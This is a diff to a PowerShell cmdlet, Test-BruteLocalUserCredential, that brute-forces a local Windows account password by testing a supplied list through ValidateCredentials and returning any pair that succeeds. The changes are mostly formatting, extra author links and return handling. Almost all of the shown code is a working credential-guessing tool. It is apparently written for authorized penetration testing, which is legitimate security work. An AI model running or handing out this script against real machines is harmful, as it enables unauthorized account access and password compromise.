@@ -1,3 +1,4 @@
+Function Test-BruteLocalUserCredential {
 <#
 .SYNOPSIS
 This cmdlet is used to brute for the password of a local user account on a windows machine
@@ -37,8 +38,10 @@ Contact: rosborne@osbornepro.com
 .LINK
 https://osbornepro.com
 https://writeups.osbornepro.com
+https://encrypit.osbornepro.com
 https://btpssecpack.osbornepro.com
 https://github.com/tobor88
+https://github.com/OsbornePro
 https://gitlab.com/tobor88
 https://www.powershellgallery.com/profiles/tobor
 https://www.linkedin.com/in/roberthosborne/
@@ -52,9 +55,7 @@ None
 
 .OUTPUTS
 None
-
 #>
-Function Test-BruteLocalUserCredential {
     [CmdletBinding()]
         param(
             [Parameter(
@@ -76,64 +77,52 @@ Function Test-BruteLocalUserCredential {
     $ErrorActionPreference = "SilentlyContinue"
     $Final = $Passwd[-1]
 
-    Write-Verbose "Adding required .NET method for Account Management"
+    Write-Verbose -Message "Adding required .NET method for Account Management"
 
     Add-Type -AssemblyName System.DirectoryServices.AccountManagement
     $Type = [DirectoryServices.AccountManagement.ContextType]::Machine
     $Attempt = [DirectoryServices.AccountManagement.PrincipalContext]::New($Type)
 
-    ForEach ($P in $Passwd)
-    {
+    ForEach ($P in $Passwd) {
 
-        Try
-        {
+        Try {
 
-            If (!($Attempt.ValidateCredentials($Username,$P)))
-            {
+            If (!($Attempt.ValidateCredentials($Username,$P))) {
 
-                Write-Verbose "FAILURE: $Username : $P"
+                Write-Verbose -Message "FAILURE: $Username : $P"
 
-            }  # End If
-            Else
-            {
+            } Else {
 
-                Write-Output "[*] SUCCESS: However this user does not have Sign In permissions"
+                Write-Output -InputObject "[*] SUCCESS: User has sign in permissions"
                 $Result = New-Object -TypeName PSCustomObject -Property @{Username=$Username; Password=$P}
 
             }  # End Else
 
-            If ($P -eq $Final)
-            {
+            If ($P -eq $Final) {
 
-                Write-Output "[*] None of the specified credentials were successful"
+                Write-Output -InputObject "[*] None of the specified credentials were successful"
 
             }  # End If
 
-        }  # End Try
-        Catch [UnauthorizedAccessException]
-        {
+        } Catch [UnauthorizedAccessException] {
 
-            Write-Verbose "FAILURE: $Username : $P"
+            Write-Verbose -Message "FAILURE: $Username : $P"
 
-        }  # End Catch Exception
-        Catch
-        {
+        } Catch {
 
-            Write-Output "[*] SUCCESS: However this user does not have Sign In permissions"
+            Write-Output -InputObject "[*] SUCCESS: However this user does not have Sign In permissions"
             $Result = New-Object -TypeName PSCustomObject -Property @{Username=$Username; Password=$P}
 
-        }  # End Catch
-        Finally
-        {
+        } Finally {
 
-            If ($Result)
-            {
+            If ($Result) {
 
-                $Result
+                Return $Result
+                Continue
 
             }  # End If
 
-        }  # End Finally
+        }  # End Try Catch Catch Finally
 
     }  # End ForEach
 
